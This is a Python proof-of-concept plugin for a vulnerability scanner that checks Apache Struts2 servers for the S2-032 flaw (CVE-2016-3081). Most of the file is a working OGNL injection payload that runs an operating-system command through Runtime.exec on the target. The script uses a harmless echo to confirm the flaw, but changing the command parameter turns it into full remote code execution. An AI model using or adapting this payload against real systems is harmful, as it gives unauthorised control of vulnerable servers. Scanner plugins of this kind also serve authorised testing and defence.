# -*- coding: utf-8 -*-
# @Time   : 2018/4/15 下午12:20
# @author : Xmchx
# @File   : s2_032.py


from collections import OrderedDict
from kunscanner.lib.utils.utils import AddScheme, RandomString, FuzzAction
import httplib
httplib.HTTPConnection._http_vsn = 10
httplib.HTTPConnection._http_vsn_str = 'HTTP/1.0'
import requests
import socket
from kunscanner.lib.core.exception import PocWarningException
from kunscanner.lib.core.enums import SCRIPT_LEVEL

def Info():
    poc_info = OrderedDict()
    poc_info['name'] = "s2_032"
    poc_info['info'] = "struts2-032 remote code execution (CVE-2016-3081)"
    poc_info['title'] = u"Struts2-032远程代码执行"
    poc_info['author'] = "Xmchx"
    poc_info['time'] = "2018.04.15"
    poc_info['type'] = 'attack'
    poc_info['level'] = SCRIPT_LEVEL.HIGH
    return poc_info



def Poc(url):
    init_url = url
    result = {}
    result['success'] = False
    result['message'] = ''

    try:
        socket.setdefaulttimeout(5)
        random_str = RandomString()
        url = AddScheme(url)
        targets = FuzzAction(url)
        payload = '''?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=echo '''+random_str
        for target in targets:
            r = requests.get(target+payload, timeout=5)
            if random_str in r.text and 'html' not in r.text:
                result['message'] = target
                result['success'] = True
                return result
        return result
    except Exception,e:
        raise PocWarningException(init_url,Info()['name'],repr(e))